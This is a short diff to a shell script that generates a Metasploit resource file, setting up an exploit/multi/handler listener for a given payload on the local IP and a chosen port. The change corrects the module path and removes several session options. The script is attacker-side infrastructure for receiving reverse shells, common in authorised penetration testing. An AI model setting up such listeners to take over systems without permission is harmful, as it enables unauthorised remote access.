@@ -7,14 +7,10 @@ IP=$( IP_No_Clip );
 New_IP=$( echo -n $IP );
 
 echo "
-use multi/handler
+use exploit/multi/handler
 set payload $1
 set LHOST $New_IP
 set LPORT $2
-set ExitOnSession false
-set AutoVerifySession false
-set AutoSystemInfo false
-set AutoLoadStdapi false
 exploit -j
 " > reverse_$2.rc
 
